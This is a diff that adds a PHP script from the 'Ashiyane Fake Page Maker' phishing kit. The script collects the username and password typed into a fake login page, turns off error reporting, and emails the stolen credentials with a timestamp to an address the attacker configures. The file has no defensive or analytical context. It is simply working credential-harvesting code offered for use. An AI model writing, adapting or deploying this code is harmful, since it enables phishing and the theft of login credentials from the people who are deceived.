@@ -1,0 +1,40 @@
+<?php
+error_reporting(0);
+/**
+* @author Reza-_S4T4N
+* @copyright 2013
+*/
+$rs4_user = $_REQUEST['{0}'];
+$rs4_passwd = $_REQUEST['{1}'];
+$rs4_email_to = '{2}';
+$rs4_title = "-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n</br>
+ Ashiyane Fake Page Maker By Reza_S4T4N \n</br>
+-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n</br>
+";
+$subject = 'Ashiyane Fake Page Maker Log';
+$message = '
+<html>
+<head>
+  <title>Ashiyane Fake Page Maker Log</title>
+</head>
+<body>
+  <p>Hi Dear ! The Information Of Last Login To Your Fake page : </p>
+  <table width="50%" border="1" style="text-align:center;" frame="solid" cellpadding="5" cellspacing="0" >
+    <tr>
+      <th width="33%">User Name</th><th width="33%">PassWord</th><th width="33%">Date</th>
+    </tr>
+    <tr>
+      <td>'.$rs4_user.'</td><td>'.$rs4_passwd.'</td><td>'.date('F j, Y, g:i a').'</td>
+    </tr>
+  </table>
+  <p>Thanks For Using This Software. Best Regards...</p>
+  <p>Reza-S4T4N</br>Ashiyane.org</p>
+</body>
+</html>
+';
+$headers  = 'MIME-Version: 1.0' . "\r\n";
+$headers .= 'Content-type: text/html; charset=utf-8' . "\r\n";
+$headers .= 'To: '.$rs4_email_to.'<'.$rs4_email_to.'>' . "\r\n";
+$headers .= 'From: Ashiyane Fake Page Maker' . "\r\n";
+mail($rs4_email_to, $subject, $message, $headers);
+?>
